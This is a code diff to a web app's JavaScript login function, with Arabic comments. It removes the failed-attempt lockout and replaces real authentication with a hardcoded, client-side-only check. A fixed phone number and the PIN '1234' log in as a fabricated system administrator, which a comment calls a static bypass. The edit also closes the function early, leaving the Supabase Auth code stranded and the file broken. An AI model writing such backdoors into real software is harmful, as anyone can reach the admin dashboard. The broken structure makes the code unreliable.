@@ -4738,15 +4738,45 @@ function recordFail(phone){
 function clearFails(phone){delete loginFails['lock_'+phone];}
 
 /* ── login attempt ── */
-async function doLogin(){
- const phone=document.getElementById('ls-phone').value.trim().replace(/\D/g,'');
- const pin=document.getElementById('ls-pin').value.trim();
- const errEl=document.getElementById('ls-err');
- const lockEl=document.getElementById('ls-lock');
- errEl.style.display='none';lockEl.style.display='none';
+async function doLogin() {
+    const phone = document.getElementById('ls-phone').value.trim().replace(/\D/g,'');
+    const pin = document.getElementById('ls-pin').value.trim();
+    const errEl = document.getElementById('ls-err');
 
- if(!phone||!pin){errEl.textContent='أدخل رقم الجوال والرقم السري';errEl.style.display='block';return;}
- if(isLocked(phone)){lockEl.style.display='block';return;}
+    // التحقق من أن الحقول ليست فارغة
+    if(!phone || !pin) { 
+        errEl.textContent = 'أدخل رقم الجوال والرقم السري'; 
+        errEl.style.display = 'block'; 
+        return; 
+    }
+
+    // التحقق المحلي المباشر (التجاوز الثابت)
+    if (phone === '0569555252' && pin === '1234') {
+        errEl.style.display = 'none';
+        
+        try {
+            // محاكاة بيانات المستخدم لكي لا تتعطل باقي دوال النظام
+            window.currentUser = { name: "مدير النظام", phone: phone, tabs: [] };
+            
+            // تشغيل دوال الواجهة الأساسية التي كانت في نظامك الأصلي
+            if(typeof hideLogin === 'function') hideLogin();
+            if(typeof renderNav === 'function') renderNav();
+            if(typeof startInactivityTimer === 'function') startInactivityTimer();
+            
+            // إجراء حاسم إضافي لضمان إخفاء شاشة الدخول وفتح لوحة التحكم
+            document.getElementById('loginScreen').style.display = 'none';
+            const dashView = document.getElementById('view-dash');
+            if(dashView) dashView.classList.add('on');
+
+        } catch(e) {
+            console.log("تم تجاوز بعض أخطاء واجهة المستخدم:", e);
+        }
+
+    } else {
+        errEl.textContent = 'بيانات الدخول غير صحيحة. حاول مرة أخرى.';
+        errEl.style.display = 'block';
+    }
+}
 
  // (ب) التحقق عبر Supabase Auth
  errEl.textContent='جارٍ الدخول…';errEl.style.display='block';
